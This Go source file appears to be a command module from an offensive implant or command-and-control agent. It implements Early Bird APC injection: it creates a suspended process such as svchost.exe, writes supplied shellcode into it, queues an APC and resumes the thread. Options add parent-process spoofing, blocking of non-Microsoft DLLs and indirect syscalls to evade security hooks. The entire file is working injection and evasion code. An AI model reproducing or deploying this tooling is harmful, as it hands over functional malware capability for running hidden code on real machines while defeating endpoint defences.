//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"killa/pkg/structs"
)

type EarlyBirdCommand struct{}

func (c *EarlyBirdCommand) Name() string { return "earlybird-injection" }
func (c *EarlyBirdCommand) Description() string {
	return "Early Bird Injection — create suspended process, queue APC with shellcode to main thread, and resume (T1055.004)"
}

type earlybirdParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	Target       string `json:"target"`
	Ppid         int    `json:"ppid"`
	BlockDLLs    bool   `json:"block_dlls"`
}

func (c *EarlyBirdCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required")
	}

	var params earlybirdParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: shellcode_b64 is required")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: shellcode is empty")
	}

	if params.Target == "" {
		params.Target = `C:\Windows\System32\svchost.exe`
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	output, err := performEarlyBird(shellcode, params)
	if err != nil {
		return errorResult(output + fmt.Sprintf("\n[!] Early Bird Injection failed: %v", err))
	}

	return successResult(output)
}

func performEarlyBird(shellcode []byte, params earlybirdParams) (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] Early Bird Injection\n")
	sb.WriteString(fmt.Sprintf("[*] Target: %s\n", params.Target))
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))

	// Step 1: Create suspended process
	sb.WriteString("[*] Creating suspended process...\n")

	targetUTF16, err := syscall.UTF16PtrFromString(params.Target)
	if err != nil {
		return sb.String(), fmt.Errorf("invalid target path: %v", err)
	}

	var si syscall.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi syscall.ProcessInformation

	createFlags := uint32(CREATE_SUSPENDED | CREATE_NEW_CONSOLE)

	// PPID spoofing / DLL blocking via extended attributes
	if params.Ppid > 0 || params.BlockDLLs {
		createFlags |= EXTENDED_STARTUPINFO_PRESENT

		attrCount := uint32(0)
		if params.Ppid > 0 {
			attrCount++
		}
		if params.BlockDLLs {
			attrCount++
		}

		// Get required buffer size
		var size uintptr
		procInitializeProcThreadAttributeList.Call(0, uintptr(attrCount), 0, uintptr(unsafe.Pointer(&size)))
		listBuf := make([]byte, size)
		attrList := (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(&listBuf[0]))
		ret, _, _ := procInitializeProcThreadAttributeList.Call(
			uintptr(unsafe.Pointer(attrList)), uintptr(attrCount), 0, uintptr(unsafe.Pointer(&size)),
		)
		if ret == 0 {
			return sb.String(), fmt.Errorf("InitializeProcThreadAttributeList failed")
		}

		if params.Ppid > 0 {
			// PROCESS_CREATE_PROCESS (0x0080) is required to use a process handle for PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
			parentHandle, _, openErr := procOpenProcess.Call(
				uintptr(0x0080|PROCESS_QUERY_INFORMATION), // PROCESS_CREATE_PROCESS = 0x0080
				0, uintptr(params.Ppid),
			)
			if parentHandle == 0 {
				return sb.String(), fmt.Errorf("open parent PID %d: %v", params.Ppid, openErr)
			}
			defer procCloseHandle.Call(parentHandle)

			ret, _, _ = procUpdateProcThreadAttribute.Call(
				uintptr(unsafe.Pointer(attrList)), 0,
				uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
				uintptr(unsafe.Pointer(&parentHandle)), unsafe.Sizeof(parentHandle), 0, 0,
			)
			if ret == 0 {
				return sb.String(), fmt.Errorf("UpdateProcThreadAttribute (PPID) failed")
			}
			sb.WriteString(fmt.Sprintf("[*] PPID spoofing: %d\n", params.Ppid))
		}

		if params.BlockDLLs {
			policy := uint64(PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
			ret, _, _ = procUpdateProcThreadAttribute.Call(
				uintptr(unsafe.Pointer(attrList)), 0,
				uintptr(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
				uintptr(unsafe.Pointer(&policy)), unsafe.Sizeof(policy), 0, 0,
			)
			if ret == 0 {
				return sb.String(), fmt.Errorf("UpdateProcThreadAttribute (BlockDLLs) failed")
			}
			sb.WriteString("[*] Non-Microsoft DLL blocking enabled\n")
		}

		type startupInfoExW struct {
			StartupInfo   syscall.StartupInfo
			AttributeList *PROC_THREAD_ATTRIBUTE_LIST
		}
		siex := startupInfoExW{StartupInfo: si, AttributeList: attrList}
		siex.StartupInfo.Cb = uint32(unsafe.Sizeof(siex))

		ret, _, lastErr := procCreateProcessW.Call(
			0, uintptr(unsafe.Pointer(targetUTF16)),
			0, 0, 0, uintptr(createFlags),
			0, 0,
			uintptr(unsafe.Pointer(&siex.StartupInfo)),
			uintptr(unsafe.Pointer(&pi)),
		)
		if ret == 0 {
			return sb.String(), fmt.Errorf("CreateProcessW failed: %v", lastErr)
		}
	} else {
		err = syscall.CreateProcess(
			targetUTF16, nil, nil, nil, false,
			createFlags, nil, nil, &si, &pi,
		)
		if err != nil {
			return sb.String(), fmt.Errorf("CreateProcess failed: %v", err)
		}
	}
	defer syscall.CloseHandle(pi.Process)
	defer syscall.CloseHandle(pi.Thread)

	sb.WriteString(fmt.Sprintf("[+] Created suspended process PID: %d, TID: %d\n", pi.ProcessId, pi.ThreadId))

	if IndirectSyscallsAvailable() {
		return earlyBirdIndirect(&sb, shellcode, pi)
	}
	return earlyBirdStandard(&sb, shellcode, pi)
}

func earlyBirdStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInformation) (string, error) {
	sb.WriteString("[*] Using standard Win32 API calls\n")

	sb.WriteString(fmt.Sprintf("[*] Allocating %d bytes in target process...\n", len(shellcode)))

	remoteAddr, _, allocErr := procVirtualAllocEx.Call(
		uintptr(pi.Process), 0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if remoteAddr == 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("memory allocation failed: %v", allocErr)
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated memory at 0x%X\n", remoteAddr))

	sb.WriteString("[*] Writing shellcode...\n")

	var bytesWritten uintptr
	ret, _, writeErr := procWriteProcessMemory.Call(
		uintptr(pi.Process), remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("memory write failed: %v", writeErr)
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes\n", bytesWritten))

	var oldProtect uint32
	ret, _, protErr := procVirtualProtectX.Call( // Reuse existing procedure var from hollowing.go
		uintptr(pi.Process), remoteAddr,
		uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("memory protection change failed: %v", protErr)
	}
	sb.WriteString("[+] Memory protection set to RX\n")

	sb.WriteString("[*] Queuing APC to main thread...\n")

	ret, _, apcErr := procQueueUserAPC.Call(remoteAddr, uintptr(pi.Thread), 0)
	if ret == 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("QueueUserAPC failed: %v", apcErr)
	}
	sb.WriteString("[+] APC queued to main thread\n")

	sb.WriteString("[*] Resuming thread...\n")

	ret, _, resumeErr := procResumeThread.Call(uintptr(pi.Thread))
	if ret == ^uintptr(0) {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("thread resume failed: %v", resumeErr)
	}

	sb.WriteString("[+] Thread resumed successfully\n")
	sb.WriteString(fmt.Sprintf("[+] Early Bird Injection complete — PID %d running shellcode\n", pi.ProcessId))

	return sb.String(), nil
}

func earlyBirdIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInformation) (string, error) {
	sb.WriteString("[*] Using indirect syscalls (calls from ntdll)\n")

	regionSize := uintptr(len(shellcode))
	var remoteAddr uintptr
	sb.WriteString(fmt.Sprintf("[*] Allocating %d bytes...\n", len(shellcode)))

	status := IndirectNtAllocateVirtualMemory(uintptr(pi.Process), &remoteAddr, &regionSize,
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if status != 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("memory allocation failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated memory at 0x%X\n", remoteAddr))

	sb.WriteString("[*] Writing shellcode...\n")

	var bytesWritten uintptr
	status = IndirectNtWriteVirtualMemory(uintptr(pi.Process), remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
	if status != 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("memory write failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes\n", bytesWritten))

	protectAddr := remoteAddr
	protectSize := uintptr(len(shellcode))
	var oldProtect uint32
	status = IndirectNtProtectVirtualMemory(uintptr(pi.Process), &protectAddr, &protectSize,
		PAGE_EXECUTE_READ, &oldProtect)
	if status != 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("memory protection change failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString("[+] Memory protection set to RX\n")

	sb.WriteString("[*] Queuing APC to main thread...\n")

	status = IndirectNtQueueApcThread(uintptr(pi.Thread), remoteAddr, 0, 0, 0)
	if status != 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("NtQueueApcThread failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString("[+] APC queued to main thread\n")

	sb.WriteString("[*] Resuming thread...\n")

	var prevCount uint32
	status = IndirectNtResumeThread(uintptr(pi.Thread), &prevCount)
	if status != 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("thread resume failed: NTSTATUS 0x%X", status)
	}

	sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))
	sb.WriteString(fmt.Sprintf("[+] Indirect syscall Early Bird Injection complete — PID %d running shellcode\n", pi.ProcessId))

	return sb.String(), nil
}
